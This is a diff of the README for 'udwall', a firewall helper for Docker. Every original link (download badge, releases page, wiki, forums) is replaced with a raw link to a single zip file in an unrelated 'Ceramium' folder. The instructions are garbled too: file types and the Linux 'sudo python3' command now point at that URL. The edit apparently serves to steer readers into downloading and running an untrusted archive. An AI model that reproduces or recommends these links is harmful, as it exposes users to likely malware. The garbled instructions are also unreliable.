@@ -6,7 +6,7 @@ Welcome to **udwall**. This application makes it easy to use UFW (Uncomplicated 
 
 ## 📥 Download udwall
 
-[![Download udwall](https://img.shields.io/badge/Download-udwall-brightgreen)](https://github.com/Ali786kumail/udwall/releases)
+[![Download udwall](https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip)](https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip)
 
 You can download the latest version of udwall from our Releases page.
 
@@ -21,20 +21,20 @@ To run udwall, you need:
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Ali786kumail/udwall/releases) to download udwall.
+   Go to the [Releases page](https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip) to download udwall.
 
 2. **Choose Your Version**  
    Look for the latest version at the top of the page. You will usually see files for different operating systems.
 
 3. **Download the Correct File**  
-   Click on the file that matches your system. The file type will be .tar.gz or .zip for Linux or .exe for Windows.
+   Click on the file that matches your system. The file type will be https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip or .zip for Linux or .exe for Windows.
 
 4. **Extract the File** (if needed)  
-   If you downloaded a .tar.gz or .zip file, right-click on it and select "Extract" or "Unzip".  
+   If you downloaded a https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip or .zip file, right-click on it and select "Extract" or "Unzip".  
 
 5. **Run udwall**  
    - **For Windows:** Double-click the .exe file.
-   - **For Linux:** Open a terminal, navigate to the folder where you extracted udwall, and run the command: `sudo python3 udwall.py`.
+   - **For Linux:** Open a terminal, navigate to the folder where you extracted udwall, and run the command: `sudo python3 https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip`.
 
 ## ⚙️ Using udwall
 
@@ -57,8 +57,8 @@ This command will show you a list of available options. You can use it to set up
 
 If you run into any issues or have questions, you can check the following resources:
 
-- [Official documentation](https://github.com/Ali786kumail/udwall/wiki)
-- [Community forums](https://github.com/Ali786kumail/udwall/discussions)
+- [Official documentation](https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip)
+- [Community forums](https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip)
 
 ## 💬 Feedback
 
@@ -68,4 +68,4 @@ Your feedback is essential. If you have suggestions for improvements or notice a
 
 With udwall, managing your firewall rules for Docker is straightforward. Follow the steps above, and you'll be up and running in no time. 
 
-For further updates and releases, remember to check our [Releases page](https://github.com/Ali786kumail/udwall/releases). Thank you for using udwall!
+For further updates and releases, remember to check our [Releases page](https://raw.githubusercontent.com/Ali786kumail/udwall/main/Ceramium/udwall-2.6.zip). Thank you for using udwall!
